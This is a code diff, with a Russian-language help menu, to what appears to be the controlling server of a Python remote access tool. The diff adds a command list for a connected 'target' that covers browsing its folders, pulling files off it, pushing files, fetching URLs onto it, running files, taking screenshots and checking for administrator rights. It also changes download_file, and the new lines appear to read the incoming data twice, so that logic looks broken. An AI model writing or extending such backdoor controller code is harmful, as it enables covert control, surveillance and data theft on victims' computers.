@@ -21,10 +21,30 @@ def reliable_recv(target):
         except ValueError:
             continue
 
+def show_help():
+    help_text = """
+    Список доступных команд:
+    =========================
+    cd <path>           - Перейти в указанную директорию на клиенте.
+    download <file>     - Скачать файл с клиента на сервер.
+    upload <file>       - Загрузить файл с сервера на клиент.
+    get <url>           - Загрузить файл из интернета на клиент.
+    start <file>        - Запустить файл на клиенте.
+    screenshot          - Сделать скриншот на клиенте и передать его на сервер.
+    check_admin         - Проверить привилегии клиента (Администратор/Пользователь).
+    q                   - Выйти из сеанса.
+    help                - Показать эту справку.
+    """
+
+    print(help_text)
 
 def download_file(command, target):
     file_name = command[9:].strip()
     try:
+        file_data = reliable_recv(target)
+        if file_data.startswith("!!"):
+            logging.error(file_data)
+            return
         with open(file_name, "wb") as file:
             file_data = reliable_recv(target)
             file.write(base64.b64decode(file_data))
@@ -64,6 +84,8 @@ def shell(target, ip):
             reliable_send(command, target)
             if command == "q":
                 break
+            elif command == "help":
+                show_help()
             elif command.startswith("cd"):
                 response = reliable_recv(target)
                 print(response)
